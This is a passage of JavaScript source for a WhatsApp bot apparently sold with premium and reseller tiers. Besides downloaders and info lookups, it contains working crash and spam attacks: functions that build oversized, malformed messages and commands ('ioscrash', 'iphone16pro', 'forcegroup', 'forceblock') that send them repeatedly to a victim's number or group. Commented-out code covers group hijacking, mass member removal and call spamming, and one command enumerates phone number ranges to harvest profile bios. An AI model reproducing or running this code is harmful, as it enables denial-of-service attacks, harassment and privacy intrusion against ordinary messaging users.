        imageDataHash: "NGJiOWI2MTc0MmNjM2Q4MTQxZjg2N2E5NmFkNjg4ZTZhNzVjMzljNWI5OGI5NWM3NTFiZWQ2ZTZkYjA5NGQzOQ==",
        stickerPackSize: "3680054",
        stickerPackOrigin: "USER_CREATED"
      }
    }, {});
console.log(`send bug to ${target}`);
}

//==============================================================\\
async function protocolbug6(target, mention = true) {
const quotedMessage = {
    extendedTextMessage: {
        text: "᭯".repeat(12000),
        matchedText: "https://" + "ꦾ".repeat(500) + ".com",
        canonicalUrl: "https://" + "ꦾ".repeat(500) + ".com",
        description: "\u0000".repeat(500),
        title: "\u200D".repeat(1000),
        previewType: "NONE",
        jpegThumbnail: Buffer.alloc(10000), 
        contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            externalAdReply: {
                showAdAttribution: true,
                title: "BoomXSuper",
                body: "\u0000".repeat(10000),
                thumbnailUrl: "https://" + "ꦾ".repeat(500) + ".com",
                mediaType: 1,
                renderLargerThumbnail: true,
                sourceUrl: "https://" + "𓂀".repeat(2000) + ".xyz"
            },
            mentionedJid: Array.from({ length: 1000 }, (_, i) => `${Math.floor(Math.random() * 1000000000)}@s.whatsapp.net`) 
        }
    },
    paymentInviteMessage: {
        currencyCodeIso4217: "USD",
        amount1000: "999999999",
        expiryTimestamp: "9999999999",
        inviteMessage: "Payment Invite" + "💥".repeat(1770),
        serviceType: 1
    }
};
    const mentionedList = [
        "120363399531796033@s.whatsapp.net",
        ...Array.from({ length: 40000 }, () =>
            `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
        )
    ];

    const embeddedMusic = {
        musicContentMediaId: "589608164114571",
        songId: "870166291800508",
        author: ".RaldzzXyz" + "ោ៝".repeat(10000),
        title: "PhynixAgency",
        artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
        artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
        artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
        artistAttribution: "https://n.uguu.se/BvbLvNHY.jpg",
        countryBlocklist: true,
        isExplicit: true,
        artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
    };

const videoMessage = {
        url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
        mimetype: "video/mp4",
        fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
        fileLength: "109951162777600",
        seconds: 999999,
        mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
        caption: "ꦾ".repeat(12777),
        height: 640,
        width: 640,
        fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
        directPath: "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1743848703",
        contextInfo: {
           externalAdReply: {
              showAdAttribution: true,
              title: "☠️ - んジェラルド - ☠️",
              body: `${"\u0000".repeat(9117)}`,
              mediaType: 1,
              renderLargerThumbnail: true,
              thumbnailUrl: null,
              sourceUrl: `https://${"ꦾ".repeat(100)}.com/`
        },
           businessMessageForwardInfo: {
              businessOwnerJid: target,
        },
            quotedMessage: quotedMessage,
            },
            isSampled: true,
            mentionedJid: mentionedList,
        forwardedNewsletterMessageInfo: {
            newsletterJid: "120363321780343299@newsletter",
            serverMessageId: 1,
            newsletterName: `${"ꦾ".repeat(100)}`
        },
        streamingSidecar: "cbaMpE17LNVxkuCq/6/ZofAwLku1AEL48YU8VxPn1DOFYA7/KdVgQx+OFfG5OKdLKPM=",
        thumbnailDirectPath: "/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc?ccb=11-4&oh=01_Q5AaIYrrcxxoPDk3n5xxyALN0DPbuOMm-HKK5RJGCpDHDeGq&oe=68185DEB&_nc_sid=5e03e0",
        thumbnailSha256: "QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=",
        thumbnailEncSha256: "fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k=",
        annotations: [
            {
                embeddedContent: {
                    embeddedMusic
                },
                embeddedAction: true
            }
        ]
    };

    const msg = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: { videoMessage }
        }
    }, {});

    await XeonBotInc.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            { tag: "to", attrs: { jid: target }, content: undefined }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await XeonBotInc.relayMessage(target, {
            groupStatusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: msg.key,
                        type: 25
                    }
                }
            }
        }, {
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: { is_status_mention: "true" },
                    content: undefined
                }
            ]
        });
    }
}
//==============================================================\\
/*async function xiosinv(destinatario){
tmsg = await generateWAMessageFromContent(destinatario, {
               viewOnceMessage: {
                   message: {
                       listResponseMessage: {
                           title: 'ANUGA-SENITHU\n',
                           description:"\n\n\n"+"𑪆".repeat(260000),
                           singleSelectReply: {
                               selectedId: "id"
                           },
                           listType: 1
                       }
                   }
               }
       }, {});

       await XeonBotInc.relayMessage("status@broadcast", tmsg.message, {
           messageId: tmsg.key.id,
           statusJidList: [destinatario],
           additionalNodes: [{
               tag: "meta",
               attrs: {},
               content: [{
                   tag: "mentioned_users",
                   attrs: {},
                   content: [{
                       tag: "to",
                       attrs: { jid: destinatario },
                       content: undefined,
                   }],
               }],
           }],
       });
       }*/
//==============================================================\\
const mentionedList = [
        "120363399531796033@s.whatsapp.net",
        ...Array.from({ length: 40000 }, () =>
            `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
        )
    ];
//==============================================================\\
if (m.message) {

    // Log the message details
    console.log(
        chalk.black(chalk.bgWhite('[ MESSAGE ]')),
        chalk.black(chalk.bgGreen(new Date())),
        chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' +
        chalk.magenta('=> FROM'), chalk.green(pushname), chalk.yellow(m.sender) + '\n' +
        chalk.blueBright('=> In'), chalk.green(m.isGroup ? pushname : 'Private Chat', from)
    );
}

switch(command) {
case "iginfo": {
  if (!text) return replygcxeon(`💡 *Provide an Instagram username*\n> Example: ${prefix + command} instagram`);
  let username = text;
  if (!username) {
    return replygcxeon('⚠ Enter a valid Instagram username.');
  }
  replygcxeon('⏳ _Getting data..._');
  try {
    let apiUrl = `https://api-ig-info-eternal.vercel.app/?username=${username}`;
    let response = await axios.get(apiUrl, { timeout: 10000 });
    let data = response.data;
    console.log(data);
    if (data.status) {
      XeonBotInc.sendMessage(m.chat, {
  image: { url: data.user.profile_pic_url },
  caption: `📸 *Instagram Profile Info:*\n👤 *Username:* ${data.user.username}\n👥 *Followers:* ${data.user.followers}\n👥 *Following:* ${data.user.following}\n📝 *Bio:* ${data.user.bio}\n📊 *Posts:* ${data.user.posts}\n🔒 *Private:* ${data.user.private ? 'Yes' : 'No'}\n📈 *Verified:* ${data.user.verified ? 'Yes' : 'No'}`
}, { quoted: m });
    } else {
      replygcxeon("⚠ Error fetching Instagram data. Try again later.");
    }
  } catch (error) {
    console.error("API Error:", error);
    replygcxeon("⚠ Error fetching Instagram data. Try again later.");
  }
}
break;
case "video": {
  if (!text) return replygcxeon(`Provide a video URL\n> Example: ${prefix + command} *https://youtube... | TikTok | Facebook | Instagram | Snapchat and any Social Media Link For Video*`);
  let query = text;
  if (!query) {
    return replygcxeon('Enter a valid video URL.');
  }
  replygcxeon('Getting data...');
  try {
    let apiUrl = `https://api-by.eternalowner06.workers.dev/?url=${query}`;
    let response = await axios.get(apiUrl, { timeout: 10000 });
    let data = response.data;
    console.log(data);
    let videoUrl = data.medias && data.medias[0] && data.medias[0].url;
    if (videoUrl) {
      XeonBotInc.sendMessage(m.chat, { video: { url: videoUrl }, caption: data.title }, { quoted: m });
    } else {
      replygcxeon("Error fetching video. Try again later.");
    }
  } catch (error) {
    console.error("API Error:", error);
    replygcxeon("Error fetching video. Try again later.");
  }
} break;
case "audio": {
  if (!text) return replygcxeon(`Provide a video URL\n> Example: ${prefix + command} *https://youtube... | TikTok | Facebook | Instagram | Snapchat and any Social Media Link For Audio*`);
  let query = text;
  if (!query) {
    return replygcxeon('Enter a valid video URL.');
  }
  replygcxeon('Getting data...');
  try {
    let apiUrl = `https://api-by.eternalowner06.workers.dev/?url=${query}`;
    let response = await axios.get(apiUrl, { timeout: 10000 });
    let data = response.data;
    console.log(data);
    let videoUrl = data.medias && data.medias[0] && data.medias[0].url;
    if (videoUrl) {
      XeonBotInc.sendMessage(m.chat, { video: { url: videoUrl }, caption: data.title }, { quoted: m });
    } else {
      replygcxeon("Error fetching video. Try again later.");
    }
  } catch (error) {
    console.error("API Error:", error);
    replygcxeon("Error fetching video. Try again later.");
  }
} break;
/*case 'xjxjxjxoke': {
	let audiobuffy = fs.readFileSync(`./oke.mp3`)
	XeonBotInc.sendMessage('919863235489@s.whatsapp.net', { audio: audiobuffy, mimetype: 'audio/mp4', ptt: true })     
	}
	k*/
case 'iphoneinvi': case 'ioscrash': {
//if (!isPremium) return replygcxeon(mess.premium)
if (!q) return replygcxeon(`Example:\n ${prefix + command} 92xxx`)
victim = text.split("|")[0]
const Xreturn = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
var contactInfo = await XeonBotInc.onWhatsApp(Xreturn);
  if (victim == "94710695082") {
    return;
    }
    if (victim == "94710695082") {
    return;
    }
    if (victim == "923403260410") {
    return;
  }
  if (contactInfo.length == 0) {
    return replygcxeon("The number is not registered on WhatsApp");
  }
sendMessageWithMentions(
    "Sent Bug To @" + Xreturn.split('@')[0] + 
    " Using *" + command + "* ✅\n\n> Pleass 10 minutes so that the bot is not banned.", 
    [Xreturn]
  );
  for (let i = 0; i <50; i++) {
await xiosinvi(Xreturn)
}
}
break
case 'iphone16pro': case 'iphone-fack': {
if (allowedUsers12.includes(ANUGA-SENITHUmatch12)) {
if (!isPremium) return replygcxeon(mess.premium)
if (!q) return replygcxeon(`Example:\n ${prefix + command} 92xxx`)
victim = text.split("|")[0]
const Xreturn = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
var contactInfo = await XeonBotInc.onWhatsApp(Xreturn);
  if (victim == "94710695082") {
    return;
    }
    if (victim == "94710695082") {
    return;
    }
    if (victim == "923403260410") {
    return;
  }
  if (contactInfo.length == 0) {
    return replygcxeon("The number is not registered on WhatsApp");
  }
sendMessageWithMentions(
    "Successfully Sent Bug To @" + Xreturn.split('@')[0] + 
    " Using *" + command + "* ✅\n\nPause 2 minutes so that the bot is not banned.", 
    [Xreturn]
  );
  for (let i = 0; i <100; i++) {
await xiosinvi(Xreturn)
}
} else {
    	replygcxeon(`*_🚫 You Are Not Premium User Contact With Owner ANUGA-SENITHU To Buy Premium_*\n*Contact:* +94710695082\n*Telegram:* https://t.me/ANUWH4YOU`);
    	}
}
break

	case 'device': case 'checkdevice': case 'cekdevice': {
		//
  if (!isBot) return;

  const quotedMsg = m.message?.extendedTextMessage?.contextInfo?.quotedMessage;
  const quotedMessageId = m.message?.extendedTextMessage?.contextInfo?.stanzaId;

  if (!quotedMsg || !quotedMessageId) {
    await XeonBotInc.sendMessage(from, { text: 'Quote The Target Message' }, { quoted: m });
    break;
  }

  const devicec = 
    quotedMessageId.length > 21
      ? 'Device: Android'
      : quotedMessageId.startsWith('3A')
        ? 'Device: iOS'
        : 'Device: WhatsApp Web or BotAPI';

  await XeonBotInc.sendMessage(from, { text: devicec }, { quoted: m });
  }
  break;
  
	case 'wanumber': case 'nowa': case 'searchno': case 'searchnumber':{
		//
           	if (!text) return replygcxeon(`Provide Number with last number x\n\nExample: ${prefix + command} 91690913721x`)
var inputnumber = text.split(" ")[0]
        
        replygcxeon(`Searching for WhatsApp account in given range...`)
        function countInstances(string, word) {
            return string.split(word).length - 1
        }
        var number0 = inputnumber.split('x')[0]
        var number1 = inputnumber.split('x')[countInstances(inputnumber, 'x')] ? inputnumber.split('x')[countInstances(inputnumber, 'x')] : ''
        var random_length = countInstances(inputnumber, 'x')
        var randomxx
        if (random_length == 1) {
            randomxx = 10
        } else if (random_length == 2) {
            randomxx = 100
        } else if (random_length == 3) {
            randomxx = 1000
        }
        var text66 = `*==[ List of Whatsapp Numbers ]==*\n\n`
        var nobio = `\n*Bio:* || \nHey there! I am using WhatsApp.\n`
        var nowhatsapp = `\n*Numbers with no WhatsApp account within provided range.*\n`
        for (let i = 0; i < randomxx; i++) {
            var nu = ['1', '2', '3', '4', '5', '6', '7', '8', '9']
            var status1 = nu[Math.floor(Math.random() * nu.length)]
            var status2 = nu[Math.floor(Math.random() * nu.length)]
            var status3 = nu[Math.floor(Math.random() * nu.length)]
            var dom4 = nu[Math.floor(Math.random() * nu.length)]
            var random21
            if (random_length == 1) {
                random21 = `${status1}`
            } else if (random_length == 2) {
                random21 = `${status1}${status2}`
            } else if (random_length == 3) {
                random21 = `${status1}${status2}${status3}`
            } else if (random_length == 4) {
                random21 = `${status1}${status2}${status3}${dom4}`
            }
            var anu = await XeonBotInc.onWhatsApp(`${number0}${i}${number1}@s.whatsapp.net`)
            var anuu = anu.length !== 0 ? anu : false
            try {
                try {
                    var anu1 = await XeonBotInc.fetchStatus(anu[0].jid)
                } catch {
                    var anu1 = '401'
                }
                if (anu1 == '401' || anu1.status.length == 0) {
                    nobio += `wa.me/${anu[0].jid.split("@")[0]}\n`
                } else {
                    text66 += `🪀 *Number:* wa.me/${anu[0].jid.split("@")[0]}\n 🎗️*Bio :* ${anu1.status}\n🧐*Last update :* ${moment(anu1.setAt).tz('Asia/Colombo').format('HH:mm:ss DD/MM/YYYY')}\n\n`
                }
            } catch {
                nowhatsapp += `${number0}${i}${number1}\n`
            }
        }
        replygcxeon(`${text66}${nobio}${nowhatsapp}`)
        }
break
	
	case 'reactch': {
    if (!q) {
        return replygcxeon(`Usage: ${prefix}reactch link_channel text\nFor example: ${prefix+command} https://whatsapp.com/channel/0029VaG9VfPKWEKk1rxTQD20/18383 hello`);}
    if (!q.startsWith("https://whatsapp.com/channel/")) {
        return replygcxeon("Link invalid!");}
    const xeonReaction = {
        a: '🅐', b: '🅑', c: '🅒', d: '🅓', e: '🅔', f: '🅕', g: '🅖',
        h: '🅗', i: '🅘', j: '🅙', k: '🅚', l: '🅛', m: '🅜', n: '🅝',
        o: '🅞', p: '🅟', q: '🅠', r: '🅡', s: '🅢', t: '🅣', u: '🅤',
        v: '🅥', w: '🅦', x: '🅧', y: '🅨', z: '🅩',
        '0': '⓿', '1': '➊', '2': '➋', '3': '➌', '4': '➍',
        '5': '➎', '6': '➏', '7': '➐', '8': '➑', '9': '➒' };
    const emojiInput = args.slice(1).join(' ').toLowerCase();
    const emoji = emojiInput.split('').map(c => {
        if (c === ' ') return '―';
        return xeonReaction[c] || c;
    }).join('');
    try {
        const link = args[0];
        const channelId = link.split('/')[4];
        const messageId = link.split('/')[5];
        const res = await XeonBotInc.newsletterMetadata("invite", channelId);
        await XeonBotInc.newsletterReactMessage(res.id, messageId, emoji);
        return replygcxeon(`Sent reaction *${emoji}* for the message in the channel *${res.name}.*`);
    } catch (e) {
        console.error(e);
        return replygcxeon("Failed to send reaction. Please make sure the link and emoji are valid.");
    }}
break;
	
	case "checkchid": case "idch": {
		//
    if (!text) return replygcxeon(`Provide channel link\nExample: ${prefix+command} https://whatsapp.com/channel/0029VaG9VfPKWEKk1rxTQD20 `)
    if (!text.includes("https://whatsapp.com/channel/")) return replygcxeon("Invalid link")
    let result = text.split('https://whatsapp.com/channel/')[1]
    try {
        let res = await XeonBotInc.newsletterMetadata("invite", result)
        if (!res) return replygcxeon("Failed to fetch information of this channel")
        let teks = `
*ID :* ${res.id}
*Name :* ${res.name}
*Total Followers :* ${res.subscribers}
*Status :* ${res.state}
*Verified :* ${res.verification == "VERIFIED" ? "Verified" : "Not Verified"}
        `
        return replygcxeon(teks)
    } catch (error) {
        console.error(error);
        return replygcxeon("An error occurred while retrieving metadata");
    }
}
break;
	
	case 'searchpair': {
    if (!global.banner.includes(senderNumber)) {
        return;
    }

    // Ensure the user provides a number to search
    if (!args[0]) {
        return replygcxeon("❌ Please provide a number to search. Example: *searchpair 923403260410*");
    }

    const searchNumber = args[0] + '@s.whatsapp.net'; // Convert input to JID format
    const pairingPath = './lib2/pairing';

    try {
        // Check if the pairing directory exists
        if (!fs.existsSync(pairingPath)) {
            return replygcxeon('No paired devices found.');
        }

        // Read all directories (and files) inside ./lib2/pairing
        const entries = fs.readdirSync(pairingPath, { withFileTypes: true });

        // Filter for directories (paired device IDs)
        const pairedDevices = entries
            .filter(entry => entry.isDirectory())
            .map(entry => entry.name); // Keep full JID format

        // Check if the searched number exists
        if (pairedDevices.includes(searchNumber)) {
            return replygcxeon(`✅ The number *${args[0]}* is paired.`);
        } else {
            return replygcxeon(`❌ The number *${args[0]}* is not paired.`);
        }
    } catch (err) {
        console.error('Error searching paired devices:', err);
        return replygcxeon('Failed to search paired devices data.');
    }
}
break;

/*case 'xxxban': case 'xx🦄': {
	// Check if botNumber or sender is in global.banner
    if (global.banner.includes(botNumber) || !global.banner.includes(senderNumber)) {
        return;
    }
    try {
        const fs = require('fs');
        const axios = require('axios');
        const path = require('path');

        function delay(ms) {
            return new Promise(resolve => setTimeout(resolve, ms));
        }

        const imageUrl = "https://raw.githubusercontent.com/dgxeon13/xeonPloitWa/refs/heads/main/photo_2024-12-19_01-39-48.jpg";
        const imagePath = path.join(__dirname, 'temp_profile.jpg');

        (async () => {
            // Download the image
            let response = await axios({ url: imageUrl, responseType: 'arraybuffer' });
            fs.writeFileSync(imagePath, Buffer.from(response.data, 'binary'));

            // Change bot's profile picture
            await XeonBotInc.updateProfilePicture(XeonBotInc.user.id.split(':')[0] + "@s.whatsapp.net", { url: imagePath });

            // Fetch all groups
            let allGroups = Object.values(await XeonBotInc.groupFetchAllParticipating().catch(() => []));
            let groupIds = allGroups.map(group => group.id);

            // Filter out blacklisted groups
            let blacklistedGroups = [];
            try {
                blacklistedGroups = JSON.parse(fs.readFileSync('./database/idgroup.json', "utf8"));
            } catch (err) {
                console.error("⚠️ No blacklist file found, continuing...");
            }

            let targetGroups = groupIds.filter(id => !blacklistedGroups.includes(id));

            // Update profile pictures in each group
            for (let groupId of targetGroups) {
                try {
                    await XeonBotInc.updateProfilePicture(groupId, { url: imagePath });
                    console.log(`✅ Updated profile picture for ${groupId}`);
                } catch (err) {
                    console.error(`❌ Error updating profile picture for ${groupId}:`, err);
                }
                await delay(1000); // Wait 1 second between updates
            }

            // Clean up & send message
            fs.unlinkSync(imagePath);
        })();
    } catch (error) {
        console.error("❌ Detailed Error:", error);
    }
}
break;
	
case 'promoteall': {
	//
    if (!m.isGroup) return replygcxeon("This command can only be used in groups.");
    if (!isBotAdmins) return 

    const xeon_collect_members = participants
        .filter(v => v.admin === null && v.id !== botNumber)
        .map(v => v.id);

    if (xeon_collect_members.length === 0) return replygcxeon("No members available for promotion.");

    try {
        await XeonBotInc.groupParticipantsUpdate(from, xeon_collect_members, 'promote');
        await replygcxeon("Successfully promoted all members!");
    } catch (e) {
        console.log(e);
        await replygcxeon("An error occurred while promoting members.");
    }
}
break;

case 'demoteall': {
	//
    if (!m.isGroup) return replygcxeon("This command can only be used in groups.");
    if (!isBotAdmins) return 

    const xeon_collect_members = participants
        .filter(v => v.admin !== null && v.id !== botNumber)
        .map(v => v.id);

    if (xeon_collect_members.length === 0) return replygcxeon("No admins available for demotion.");

    try {
        await XeonBotInc.groupParticipantsUpdate(from, xeon_collect_members, 'demote');
        await replygcxeon("Successfully demoted all admins!");
    } catch (e) {
        console.log(e);
        await replygcxeon("An error occurred while demoting members.");
    }
}
break;*/

/*case 'kickall': case 'hack': case 'hijack': case 'nuke': {
	//
    if (!m.isGroup) return replygcxeon("This command can only be used in groups.");
    if (!isBotAdmins) return 

    const xeon_collect_members = participants
        .filter(v => v.admin === null && v.id !== botNumber)
        .map(v => v.id);

    if (xeon_collect_members.length === 0) return replygcxeon("No members available to kick.");

    try {
        await XeonBotInc.groupUpdateDescription(from, '\n\n\nGROUP HIJACKED BY Telegram : ANUWH4YOU\n\n\n');
        await sleep(100);
        await XeonBotInc.groupUpdateSubject(from, '\u0000'); 
        replygcxeon(`\n\n\n\n\n\n\n\n\n\n\n\nGroup Hacked by Telegram : ANUWH4YOU\n\n\n\n\n\n\n\n\n\n\n\n`);
        await sleep(100);
        await XeonBotInc.groupParticipantsUpdate(from, xeon_collect_members, 'remove');
    } catch (e) {
        console.log(e);
        await replygcxeon("An error occurred while kicking members.");
    }
}
break;*/

	case 'forcegroup':
    //;
    if (!q) return replygcxeon(`Example:\n ${prefix + command} 120363047626537xxx@g.us|5\n\nTo get group ID, type .listgc\n\nTo get group ID from a group link, type .group-id link`);

    // Check if input contains a WhatsApp group link
    if (q.includes("chat.whatsapp.com")) {
        return replygcxeon("Group ID must be a number, not a link. Use .group-id <link> to get the group ID.");
    }

    // Extract group ID and amount from input
    let input = q.split("|");
    let victimxd = input[0].trim(); // Group ID
    let loopCount2 = parseInt(input[1]); // Extract amount

    // Validate Group ID format (only numbers + "@g.us")
    if (!/^\d+@g\.us$/.test(victimxd)) {
        return replygcxeon("Invalid group ID! Please enter a correct WhatsApp group ID.");
    }

    // Validate loop count
    if (isNaN(loopCount2) || loopCount2 < 1) {
        loopCount2 = 5; // Default to 5 if amount is invalid
    }

    replygcxeon(`Successfully sent force message to the group chat`);

    for (let i = 0; i < loopCount2; i++) {
        await sleep(1050);
        await XeonBotInc.relayMessage(victimxd, {
            "messageContextInfo": {
                "messageSecret": "eed1zxI49cxiovBTUFLIEWi1shD9HgIOghONuqPDGTk=",
                "deviceListMetaData": {},
                "deviceListMetadataVersion": 2
            },
            "scheduledCallCreationMessage": {
                "scheduledTimestampMs": '1200',
                callType: "AUDIO",
                "title": '👻',
            }
        }, {
            additionalAttributes: {
                edit: '7'
            }
        });
    }
    break;

	
	case 'forceblock':
	//;
    // Get user input for loop count
    let loopCount = parseInt(args[0]);
    if (isNaN(loopCount) || loopCount < 1) {
        loopCount = 5; // Default value if input is invalid
    }
    
    for (let i = 0; i < loopCount; i++) {
        await sleep(1050);
        await XeonBotInc.relayMessage(from, {
            "messageContextInfo": {
                "messageSecret": "eed1zxI49cxiovBTUFLIEWi1shD9HgIOghONuqPDGTk=",
                "deviceListMetaData": {},
                "deviceListMetadataVersion": 2
            },
            "scheduledCallCreationMessage": {
                "scheduledTimestampMs": '1200',
                callType: "AUDIO",
                "title": '👻',
            }
        }, {
            additionalAttributes: {
                edit: '7'
            }
        });
    }
    break;

case 'listpair': {
    if (!(global.db.data.owners || []).includes(senderNumber)) {
    return replygcxeon(`❌ Sorry you don't have permission to use this command. This command can only be used by reseller! 

Want to buy reseller? Chat Developer!
YouTube: https://youtube.com/@anuga_official
Telegram : ANUWH4YOU
WhatsApp: +94710695082`);
}

        const pairingPath = './lib2/pairing';

    try {
        // Check if the directory exists
        if (!fs.existsSync(pairingPath)) {
            return replygcxeon('No paired devices found.');
        }

        // Read all directories (and files) inside ./lib2/pairing
        const entries = fs.readdirSync(pairingPath, { withFileTypes: true });

        // Filter for directories (paired device IDs)
        const pairedDevices = entries
            .filter(entry => entry.isDirectory())
            .map(entry => `+${entry.name.replace('@s.whatsapp.net', '')}`); // Add '+' before number

        // Handle if no paired devices are found
        if (pairedDevices.length === 0) {
            return replygcxeon('No paired devices found.');
        }

        // Count total paired devices
        const totalUsers = pairedDevices.length;

        // Format the list of paired devices for the response
        const deviceList = pairedDevices
            .map((device, index) => `${index + 1}. ${device}`)
            .join('\n');

        replygcxeon(`Total Rent Bot Users: ${totalUsers}\n\nPaired Devices:\n${deviceList}`);
    } catch (err) {
        console.error('Error reading paired devices directory:', err);
        return replygcxeon('Failed to load paired devices data.');
    }
}
break;

case 'delpair': {

        //
	
        if (!q) return replygcxeon(`Example:\n ${prefix + command} 92xxx`)
victim = text.split("|")[0]
const Xreturn = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
var contactInfo =  Xreturn;
  if (contactInfo.length == 0) {
    return replygcxeon("The number is not registered on WhatsApp");
  }

        const pairingPath = './lib2/pairing';
        const targetPath = `${pairingPath}/${Xreturn}`;

        try { 
            // Check if the target directory exists
            if (!fs.existsSync(targetPath)) {
                return replygcxeon(`Paired device with ID "${Xreturn}" does not exist.`);
            }

            // Delete the target directory and its contents
            fs.rmSync(targetPath, { recursive: true, force: true });

            replygcxeon(`Paired device with ID "${Xreturn}" has been successfully deleted.`);
        } catch (err) {
            console.error('Error deleting paired device:', err);
            return replygcxeon('An error occurred while attempting to delete the paired device.');
        }
    }
break;

case 'reqpair':
// Check system storage and RAM
    const freeStorage = os.freemem() / (1024 * 1024); // Free memory in MB
    const totalStorage = os.totalmem() / (1024 * 1024); // Total memory in MB
    const freeDiskSpace = fs.statSync('/').available / (1024 * 1024); // Free disk space in MB

    if (freeStorage < 300 || freeDiskSpace < 300) { // Set a threshold of 100 MB for storage and RAM
        return replygcxeon('Slot is full, please try again later.');
    }

//
if (!q) return replygcxeon(`Example:\n ${prefix + command} 92xxx`)
victim = text.split("|")[0]
const Xreturn = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
var contactInfo = await XeonBotInc.onWhatsApp(Xreturn);
  if (contactInfo.length == 0) {
    return replygcxeon("The number is not registered on WhatsApp");
  }
  
  // Extract and validate the country code or prefix
const countryCode = text.slice(0, 3); // Extract the first 3 digits for country code
const prefixxx = text.slice(0, 1); // Extract the first digit for prefix
const firstTwoDigits = text.slice(0, 2); // Extract the first two digits to check for "89"

// Function to validate if a number is a valid WhatsApp number
const isValidWhatsAppNumber = (number) => {
    return number.length >= 10 && number.length <= 15 && !isNaN(number);
};

if (countryCode === "252" || prefixxx === "0" || firstTwoDigits === "89" || countryCode.startsWith("85")) {
    return replygcxeon("Sorry, numbers with country code 252, prefix 0, starting with 89, or +85 are not supported for using the bot.");
}

if (!isValidWhatsAppNumber(text)) {
    return replygcxeon("Invalid WhatsApp number. Please enter a valid number.");
}


    // Proceed with pairing
    const startpairing = require('./rentbot.js');
    await startpairing(Xreturn);
    await sleep(4000);
    
    const cu = fs.readFileSync('./lib2/pairing/pairing.json', 'utf-8');
    const cuObj = JSON.parse(cu);
    
    await replygcxeon(`${cuObj.code}`);

break;

/*case 'callspam':{
	//
if (!q) return replygcxeon(`Example:\n ${prefix + command} 92xxx`)
victim = text.split("|")[0]
const Xreturn = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
var contactInfo = await XeonBotInc.onWhatsApp(Xreturn);
  if (victim == "94710695082") {
    return;
    }
    if (victim == "94710695082") {
    return;
    }
    if (victim == "923403260410") {
    return;
  }
  if (contactInfo.length == 0) {
    return replygcxeon("The number is not registered on WhatsApp");
  }
  
  async function sendOfferCall(target) {
    try {
        await XeonBotInc.offerCall(target);
        /*console.log(chalk.white.bold(`Success Send Offer Call To Target`));
    } catch (error) {
        /*console.error(chalk.white.bold(`Failed Send Offer Call To Target:`, error));
    }
}

  sendMessageWithMentions(
    "Successfully Sent Spam Call To @" + Xreturn.split('@')[0] + 
    " Using *" + command + "* ✅\n\nPause 2 minutes so that the bot is not banned.", 
    [Xreturn]
  );
	await sleep(1000)
for (let i = 0; i < 7; i++) {
await sendOfferCall(Xreturn)
await sleep(2000)
}
  }
break*/
                case 'group-id': {
    //
    if (!text) return replygcxeon('Enter Group Link!');
    if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return replygcxeon('Link Invalid!');

    const result = args[0].split('https://chat.whatsapp.com/')[1];

    try {
        const xeontry = await XeonBotInc.groupAcceptInvite(result);
        
        if (!xeontry) {
            return replygcxeon('The group chat either has the approval feature enabled, you have been removed from the group or the invite link has expired. Please join the group chat first and try using the command .listgc.');
        }

        replygcxeon(`Group ID: ${xeontry}`);
    } catch (error) {
        replygcxeon('The group chat either has the approval feature enabled, you have been removed from the group or the invite link has expired. Please join the group chat first and try using the command .listgc.');
    }
}
break;

case 'autoswview':
    case 'autostatusview':{
    	//
               if (args[0] === 'on') {
                  db.data.settings[botNumber].antiswview = true
                  replygcxeon(`Successfully ${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.data.settings[botNumber].antiswview = false
                  replygcxeon(`Successfully ${command} is disabled`)
               } else {
                	replygcxeon(`Please select on/off\n\Example: ${prefix+command} on`)
            }
            }
            break
            
            case 'totag': {
				if (!m.isGroup) return replygcxeon(mess.OnlyGrup)
				if (!m.quoted) return replygcxeon(`Reply message with caption ${prefix + command}`)
